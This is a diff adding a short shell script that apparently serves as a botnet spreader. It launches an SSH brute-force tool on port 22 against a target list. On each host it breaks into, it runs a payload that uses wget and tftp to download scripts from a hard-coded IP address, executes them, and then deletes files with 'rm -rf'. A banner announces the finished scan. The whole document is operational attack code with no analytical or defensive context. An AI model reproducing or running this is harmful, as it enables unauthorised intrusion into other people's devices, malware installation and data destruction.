@@ -1,0 +1,4 @@
+clear
+./brute 9500 -f $1 naffey 22 "cd /tmp || cd /run || cd /; wget http://89.42.133.67/axisbins.sh; chmod 777 axisbins.sh; sh axisbins.sh; tftp 89.42.133.67 -c get axistftp1.sh; chmod 777 axistftp1.sh; sh axistftp1.sh; tftp -r axistftp2.sh -g 89.42.133.67; chmod 777 axistftp2.sh; sh axistftp2.sh; rm -rf axisbins.sh axistftp1.sh axistftp2.sh; rm -rf *"
+clear
+echo -e "\e[35m[PRIVATE] \e[97mHRDMV1 - \e[32mScan Has Been Finished ! All Output has been saved in --> \e[91mgasite.txt"
